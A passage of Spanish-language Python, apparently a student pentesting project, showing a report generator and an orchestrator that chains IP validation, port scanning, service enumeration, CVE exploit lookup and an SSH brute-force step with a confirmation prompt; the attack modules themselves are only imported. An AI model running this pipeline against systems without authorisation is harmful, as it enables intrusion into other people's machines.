+            <h3>#{h['numero']} - {h['titulo']} 
+                <span class="severidad {h['severidad'].lower()}">{h['severidad']}</span>
+            </h3>
+            <p>{h['descripción']}</p>
+            {f"<p><strong>Impacto:</strong> {h['impacto']}</p>" if 'impacto' in h else ""}
+        </div>
+"""
+        
+        # Generar HTML de recomendaciones
+        recomendaciones_html = ""
+        for rec in reporte['recomendaciones']:
+            pasos_html = "<ul class='pasos'>"
+            for paso in rec['pasos']:
+                pasos_html += f"<li>{paso}</li>"
+            pasos_html += "</ul>"
+            
+            recomendaciones_html += f"""
+        <div class="recomendacion">
+            <h3>{rec['titulo']}</h3>
+            <p><strong>Prioridad:</strong> {rec['prioridad']} | <strong>Plazo:</strong> {rec['plazo']}</p>
+            <p>{rec['descripción']}</p>
+            {pasos_html}
+        </div>
+"""
+        
+        # Reemplazar placeholders
+        html = html.format(
+            fecha=reporte['metadata']['fecha'],
+            ip=reporte['metadata']['ip_objetivo'],
+            timestamp=reporte['metadata']['timestamp'],
+            nivel_riesgo=reporte['nivel_riesgo_general'],
+            nivel_riesgo_clase=reporte['nivel_riesgo_general'].split()[0].lower().replace('🔴', 'critico').replace('🟠', 'alto').replace('🟡', 'medio').replace('🟢', 'bajo'),
+            resumen=reporte['resumen_ejecutivo'].replace('\n', '<br>\n'),
+            total_hallazgos=reporte['estadisticas']['total_hallazgos'],
+            puertos_abiertos=reporte['estadisticas']['puertos_abiertos'],
+            vulnerabilidades=reporte['estadisticas']['vulnerabilidades_encontradas'],
+            criticos=reporte['estadisticas']['criticos'],
+            hallazgos_html=hallazgos_html,
+            recomendaciones_html=recomendaciones_html,
+            conclusiones=reporte['conclusiones']
+        )
+        
+        # Guardar archivo
+        nombre_archivo = f"reporte_{ip_objetivo.replace('.', '_')}.html"
+        with open(nombre_archivo, 'w', encoding='utf-8') as f:
+            f.write(html)
+        
+        print(f"\n[+] Reporte HTML generado: {nombre_archivo}")
+        return nombre_archivo
+    
+    def exportar_json(self, reporte: Dict, ip_objetivo: str) -> str:
+        """Exporta reporte a JSON."""
+        
+        nombre_archivo = f"reporte_{ip_objetivo.replace('.', '_')}.json"
+        with open(nombre_archivo, 'w', encoding='utf-8') as f:
+            json.dump(reporte, f, indent=2, ensure_ascii=False)
+        
+        print(f"[+] Reporte JSON generado: {nombre_archivo}")
+        return nombre_archivo
+    
+    def mostrar_resumen(self, reporte: Dict):
+        """Muestra resumen en pantalla."""
+        
+        print("\n" + "="*70)
+        print("REPORTE DE AUDITORÍA - RESUMEN")
+        print("="*70)
+        
+        print(f"\nIP Objetivo: {reporte['metadata']['ip_objetivo']}")
+        print(f"Fecha: {reporte['metadata']['fecha']}")
+        print(f"Nivel de Riesgo: {reporte['nivel_riesgo_general']}\n")
+        
+        print("RESUMEN EJECUTIVO:")
+        print("-" * 70)
+        print(reporte['resumen_ejecutivo'])
+        
+        print("\n" + "-" * 70)
+        print("ESTADÍSTICAS:")
+        print("-" * 70)
+        stats = reporte['estadisticas']
+        print(f"Total de hallazgos: {stats['total_hallazgos']}")
+        print(f"Puertos abiertos: {stats['puertos_abiertos']}")
+        print(f"Vulnerabilidades encontradas: {stats['vulnerabilidades_encontradas']}")
+        print(f"Hallazgos críticos: {stats['criticos']}")
+        print(f"Acceso comprometido: {'SÍ' if stats['acceso_comprometido'] else 'NO'}")
+
+
+def main():
+    """Función principal."""
+    
+    print("╔════════════════════════════════════════╗")
+    print("║     AGENTE 6: REPORT GENERATOR       ║")
+    print("║    Diego Mercedes Llauger (2026-0048) ║")
+    print("╚════════════════════════════════════════╝")
+    
+    # Simular resultados de todos los agentes
+    resultados_ejemplo = {
+        'agente_1': {
+            'válida': True,
+            'ip': '192.168.1.100',
+            'rango': 'PRIVADA'
+        },
+        'agente_2': {
+            'puertos_abiertos': [22, 80, 443, 3306]
+        },
+        'agente_3': {
+            22: {'estado': 'identificado', 'servicio': 'OpenSSH', 'versión': '7.4'},
+            80: {'estado': 'identificado', 'servicio': 'Apache', 'versión': '2.4.29'}
+        },
+        'agente_4': {
+            'total_exploits': 2,
+            'exploits_encontrados': [
+                {'cve': 'CVE-2018-15473', 'servicio': 'OpenSSH', 'descripción': 'User enumeration'},
+                {'cve': 'CVE-2021-41773', 'servicio': 'Apache', 'descripción': 'Path Traversal RCE'}
+            ]
+        },
+        'agente_5': {
+            'acceso_logrado': True,
+            'credenciales': {'usuario': 'admin', 'contraseña': 'admin123'},
+            'intentos_totales': 3
+        }
+    }
+    
+    # Generar reporte
+    generator = ReportGenerator()
+    ip = "192.168.1.100"
+    reporte = generator.generar_reporte_completo(resultados_ejemplo, ip)
+    
+    # Mostrar resumen
+    generator.mostrar_resumen(reporte)
+    
+    # Exportar a HTML
+    generator.exportar_html(reporte, ip)
+    
+    # Exportar a JSON
+    generator.exportar_json(reporte, ip)
+    
+    print("\n✓ Reportes generados exitosamente")
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except Exception as e:
+        print(f"\n❌ Error: {e}")
+
+         Script ejecutor completo (all_agents.py)
+
+         #!/usr/bin/env python3
+"""
+EJECUTOR COMPLETO: Todos los agentes en cadena
+
+Autor: Diego Mercedes Llauger (2026-0048)
+Uso: python all_agents.py
+"""
+
+import json
+import sys
+from datetime import datetime
+
+# Importar todos los agentes
+from agentes.agente_1_validador_ip.validador_ip import IPValidator
+from agentes.agente_2_scanner_puertos.scanner_puertos import PortScanner
+from agentes.agente_3_enumerador.enumerador import ServiceEnumerator
+from agentes.agente_4_vulnerability_checker.vuln_checker import VulnerabilityChecker
+from agentes.agente_5_brute_force.brute_force import BruteForceAgent
+
+
+class SistemaCompleto:
+    """Orquestador de todos los agentes."""
+    
+    def __init__(self):
+        self.resultados = {}
+        self.timestamp = datetime.now().isoformat()
+    
+    def ejecutar_pipeline(self, ip: str, puerto_ssh: int = 22):
+        """Ejecuta toda la cadena de agentes."""
+        
+        print("\n" + "="*70)
+        print("SISTEMA MULTIAGENTE DE RECONOCIMIENTO")
+        print("Diego Mercedes Llauger (2026-0048)")
+        print("="*70)
+        
+        # AGENTE 1: Validar IP
+        print("\n[AGENTE 1] Validando IP...")
+        validator = IPValidator()
+        resultado_1 = validator.validar(ip)
+        self.resultados['agente_1'] = resultado_1
+        
+        if not resultado_1.get('válida'):
+            print("❌ IP inválida, terminando")
+            return
+        
+        print(f"✓ IP válida: {resultado_1['rango']} ({resultado_1['tipo']})")
+        
+        # AGENTE 2: Escanear puertos
+        print("\n[AGENTE 2] Escaneando puertos...")
+        scanner = PortScanner(timeout=3)
+        puertos_a_escanear = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5432, 8080, 8443]
+        resultado_2 = scanner.escanear_rango(ip, puertos_a_escanear)
+        self.resultados['agente_2'] = resultado_2
+        
+        if not resultado_2['puertos_abiertos']:
+            print("⚠️ Sin puertos abiertos en rango común, terminando")
+            return
+        
+        print(f"✓ Puertos abiertos: {resultado_2['puertos_abiertos']}")
+        
+        # AGENTE 3: Enumerar servicios
+        print("\n[AGENTE 3] Enumerando servicios...")
+        enumerador = ServiceEnumerator(timeout=5)
+        servicios = {}
+        
+        for puerto in resultado_2['puertos_abiertos'][:3]:  # Solo primeros 3 para demo
+            resultado_enum = enumerador.enumerar_puerto(ip, puerto)
+            servicios[puerto] = resultado_enum
+            
+            if resultado_enum.get('estado') == 'identificado':
+                print(f"✓ Puerto {puerto}: {resultado_enum['servicio']} {resultado_enum['versión']}")
+        
+        self.resultados['agente_3'] = servicios
+        
+        # AGENTE 4: Buscar exploits
+        print("\n[AGENTE 4] Buscando exploits...")
+        checker = VulnerabilityChecker()
+        
+        # Recolectar CVEs de todos los servicios
+        cves_encontradas = []
+        for puerto, info in servicios.items():
+            if info.get('cve_conocidas'):
+                for cve in info['cve_conocidas']:
+                    cves_encontradas.append({"cve": cve.get('cve')})
+        
+        resultado_4 = checker.buscar_exploits(cves_encontradas)
+        self.resultados['agente_4'] = resultado_4
+        
+        print(f"✓ Exploits encontrados: {resultado_4['total_exploits']}")
+        
+        # AGENTE 5: Brute Force SSH (si puerto 22 está abierto)
+        if 22 in resultado_2['puertos_abiertos']:
+            print("\n[AGENTE 5] Intentando brute force SSH...")
+            print("⚠️ ADVERTENCIA: Solo continuar si está autorizado")
+            continuar = input("¿Continuar? (S/N): ").upper()
+            
+            if continuar == 'S':
+                brute = BruteForceAgent(timeout=5)
+                resultado_5 = brute.brute_force(
+                    ip, puerto_ssh,
+                    max_intentos=10,
+                    delay=300
+                )
+                self.resultados['agente_5'] = resultado_5
+                
+                if resultado_5['acceso_logrado']:
+                    print(f"✓ ACCESO LOGRADO: {resultado_5['credenciales']['usuario']}")
+                else:
+                    print("✗ Brute force fallido")
+            else:
+                print("Omitiendo Agente 5")
+        
+        # Generar reporte
+        self._generar_reporte()
+    
+    def _generar_reporte(self):
+        """Genera reporte final."""
+        
+        print("\n" + "="*70)
+        print("REPORTE FINAL")
+        print("="*70)
+        
+        reporte = {
+            "timestamp": self.timestamp,
+            "resultados": self.resultados,
+            "resumen": {
+                "agentes_ejecutados": len(self.resultados),
+                "ip_validada": self.resultados.get('agente_1', {}).get('válida', False),
+                "puertos_encontrados": len(self.resultados.get('agente_2', {}).get('puertos_abiertos', [])),
+                "servicios_identificados": len([x for x in self.resultados.get('agente_3', {}).values() 
+                                               if isinstance(x, dict) and x.get('estado') == 'identificado']),
+                "exploits_encontrados": self.resultados.get('agente_4', {}).get('total_exploits', 0),
+                "acceso_logrado": self.resultados.get('agente_5', {}).get('acceso_logrado', False)
+            }
+        }
+        
+        # Mostrar resumen
+        print(f"\nIP validada: {'✓' if reporte['resumen']['ip_validada'] else '✗'}")
+        print(f"Puertos abiertos: {reporte['resumen']['puertos_encontrados']}")
+        print(f"Servicios identificados: {reporte['resumen']['servicios_identificados']}")
+        print(f"Exploits encontrados: {reporte['resumen']['exploits_encontrados']}")
+        print(f"Acceso logrado: {'✓' if reporte['resumen']['acceso_logrado'] else '✗'}")
+        
+        # Guardar reporte
+        nombre_archivo = f"reporte_{self.resultados.get('agente_1', {}).get('ip', 'desconocida').replace('.', '_')}.json"
+        with open(nombre_archivo, 'w', encoding='utf-8') as f:
+            json.dump(reporte, f, indent=2, ensure_ascii=False)
+        
+        print(f"\n✓ Reporte guardado: {nombre_archivo}")
+
+
+def main():
+    """Función principal."""
+    
+    print("╔════════════════════════════════════════╗")
+    print("║   SISTEMA MULTIAGENTE COMPLETO       ║")
+    print("║    Diego Mercedes Llauger (2026-0048) ║")
+    print("╚════════════════════════════════════════╝")
+    
+    ip = input("\nIP objetivo: ").strip()
+    puerto_ssh = int(input("Puerto SSH (defecto 22): ") or "22")
+    
+    sistema = SistemaCompleto()
+    sistema.ejecutar_pipeline(ip, puerto_ssh)
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n⛔ Operación interrumpida")
+        sys.exit(0)
+    except Exception as e:
+        print(f"\n❌ Error: {e}")
+        sys.exit(1)
